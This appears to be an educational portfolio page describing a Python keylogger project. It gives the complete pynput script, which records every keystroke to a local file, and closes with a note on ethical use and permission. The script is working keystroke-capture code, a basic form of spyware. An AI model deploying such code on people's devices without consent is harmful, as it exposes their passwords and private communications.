<h2>🛠️ Keylogger Script</h2>

<p><strong>Description:</strong><br>
This project involves the development of a Python-based keylogger using the <code>pynput</code> library to capture and log user keystrokes in real time. The script records both regular characters and special keys, writing them to a secure local file. It demonstrates fundamental concepts in input event handling, file I/O, and system-level programming, and serves as an educational tool for understanding user input tracking and ethical hacking practices.
</p>

<h3>🔑 Skills Learned</h3>
<ul>
  <li>Captured keyboard events using <code>pynput</code> and handled both character and non-character inputs.</li>
  <li>Implemented file logging mechanisms to store keystroke data securely.</li>
  <li>Learned the basics of stealth input capture and the importance of responsible ethical usage in cybersecurity education.</li>
  <li>Strengthened Python scripting abilities and real-time event handling concepts.</li>
</ul>

<h3>🧰 Tools Used</h3>
<ul>
  <li><strong>Python</strong>: Main scripting language.</li>
  <li><strong>pynput</strong>: Python library for keyboard/mouse input control and logging.</li>
  <li><strong>Terminal/CLI</strong>: Running and testing script behavior.</li>
</ul>

<h3>⚙️ Steps</h3>
<ol>
  <li>Set up Python environment and installed <code>pynput</code> with <code>pip install pynput</code>.</li>
  <li>Wrote a listener function to capture key presses and distinguish between regular and special keys.</li>
  <li>Created a logging system that appends each captured keystroke to a local file (<code>keyfile.txt</code>).</li>
  <li>Tested the script across different input scenarios and ensured stability in continuous listening mode.</li>
</ol>

<h3>📄 Keylogger Script Code</h3>
<pre><code>from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            logkey.write(f'[{key}]')  # Handle special keys
            print("Non-character key")

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()  # Keep the program running
</code></pre>

<p><em>Note:</em> This project is for ethical, educational purposes only. It is essential to obtain explicit permission before running keyloggers on any device.</p>
